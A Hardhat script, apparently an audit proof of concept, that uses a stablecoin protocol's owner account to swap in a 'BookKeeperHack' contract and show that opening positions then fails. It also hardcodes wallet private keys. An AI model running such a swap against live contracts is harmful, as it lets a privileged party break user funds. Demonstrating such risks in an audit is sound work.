import { task } from "hardhat/config";
import { Wallet } from "ethers";
import addresses from '../addresses.json';

task("C1", "crit 1")
  .setAction(async (taskArgs, { ethers }) => {
    // accounts
    const accountOwnerContracts = new ethers.Wallet('2a8dea9595bd82f62eb12ed0c61aea5cc9ab309827dd34e28c775ed53d295646', ethers.provider);
    const account1 = new ethers.Wallet('0xcd66e428f4e6e994781f365b67ea57e128dd6feef5d98aaf086a703d050166ff', ethers.provider);

    // contracts
    const collateralTokenAdapter = new ethers.Contract(addresses['collateralTokenAdapter'], require("../build/contracts/CollateralTokenAdapter.json").abi, account1);
    const positionManager = new ethers.Contract(addresses['positionManager'], require("../build/contracts/PositionManager.json").abi, account1);
    const stablecoinAdapter = new ethers.Contract(addresses['stablecoinAdapter'], require("../build/contracts/StablecoinAdapter.json").abi, account1);
    const stablecoinERC20 = new ethers.Contract(await stablecoinAdapter.stablecoin(), require("../build/contracts/ERC20.json").abi, account1);
    const iFace = new ethers.Interface(require("../build/contracts/FathomStablecoinProxyActions.json").abi);

    const collateralPoolId = await collateralTokenAdapter.collateralPoolId();
    const proxyWallet = await getProxyWallet(account1, accountOwnerContracts);

    // first run is successfully
    try {
      await debt();
      console.log("open position is successfully");
    } catch {
      console.log("open position is failed");
    }

    // 1. deploy hack contract
    const bookKeeperHack = await ethers.deployContract("BookKeeperHack", [], accountOwnerContracts);
    await bookKeeperHack.waitForDeployment();

    // 2. set hack BookKeeper
    try {
      await positionManager.connect(accountOwnerContracts).setBookKeeper(bookKeeperHack.target);
    } catch {
      console.log("'setBookKeeper' doesn't work anymore");
    }
    
    // next run is failed
    try {
      await debt();
      console.log("open position is successfully");
    } catch {
      console.log("open position is failed");
    }

    async function debt() {
      await proxyWallet.execute(
        iFace.encodeFunctionData("openLockXDCAndDraw", [
          addresses['positionManager'],
          addresses['stabilityFeeCollector'],
          addresses['collateralTokenAdapter'],
          addresses['stablecoinAdapter'],
          collateralPoolId,
          100n * 10n ** 18n,
          '0x00'
        ]), {value: 2000n * 10n ** 18n}
      );
      console.log('balanceOf', ethers.formatEther(await stablecoinERC20.balanceOf(account1.address)));
    }
    async function getProxyWallet(account: Wallet, accountOwner: Wallet) {
      const proxyWalletRegistry = new ethers.Contract(addresses['proxyWalletRegistry'], require("../build/contracts/ProxyWalletRegistry.json").abi, account);
      await proxyWalletRegistry.connect(accountOwner).setDecentralizedMode(true);
      
      let proxyWalletAddress = await proxyWalletRegistry.proxies(account.address);
      if (proxyWalletAddress == ethers.ZeroAddress) {
        await proxyWalletRegistry.build(account.address);
        proxyWalletAddress = await proxyWalletRegistry.proxies(account.address);
      }
    
      const proxyWallet = new ethers.Contract(proxyWalletAddress, require("../build/contracts/ProxyWallet.json").abi, account);
    
      return proxyWallet;
    }
});